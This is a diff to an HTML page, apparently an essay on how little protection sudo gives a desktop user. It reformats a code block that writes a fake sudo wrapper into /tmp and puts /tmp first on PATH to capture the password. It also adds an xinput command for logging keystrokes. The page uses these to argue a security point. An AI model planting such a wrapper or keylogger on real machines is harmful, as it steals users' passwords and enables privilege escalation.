@@ -49,8 +49,7 @@
     just setup their own fake sudo program to grab the user password. <br>
     <br>
     This is all it takes to get your <code>sudo</code> password:
-    <pre><code>
-cat &lt;&lt;\EOF > /tmp/sudo
+    <pre><code>cat &lt;&lt;\EOF > /tmp/sudo
 #!/bin/bash
 if [[ "${@}" = "" ]]; then
   /usr/bin/sudo
@@ -62,8 +61,13 @@ else
 fi
 EOF
 chmod +x /tmp/sudo
-export PATH="/tmp:${PATH}"
-    </code></pre>
+export PATH="/tmp:${PATH}"</code></pre>
+    <br>
+    Or:
+    <pre><code>xinput list # find your keyboard ID
+xinput test id # replace "id" with the ID from the above command</code></pre>
+    <br>
+    etc. <br>
     <br>
     Now the attacker is just a <code>modprobe</code> away from full kernel privileges.
   </p>
